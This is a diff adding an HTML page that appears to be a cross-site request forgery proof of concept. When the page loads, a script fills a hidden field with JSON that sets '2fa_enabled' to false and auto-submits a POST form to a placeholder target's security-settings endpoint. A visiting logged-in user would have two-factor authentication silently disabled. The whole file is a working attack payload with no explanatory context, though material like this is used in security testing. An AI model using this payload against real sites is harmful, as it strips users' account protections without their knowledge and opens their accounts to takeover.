@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+<script>
+$(document).ready(function() {
+    // Dynamically update the value of the hidden input
+    $("#z").val(JSON.stringify({ "2fa_enabled": false }));
+    
+    // Automatically submit the form when the page loads
+    $("#f").submit();
+});
+</script>
+</head>
+<body>
+<form id="f" enctype="text/plain" action="https://target.com/api/settings/security" method="post">
+    <input id="z" type="hidden" name="data" value=''> 
+    <input type="submit" value="send">
+</form>
+</body>
+</html>
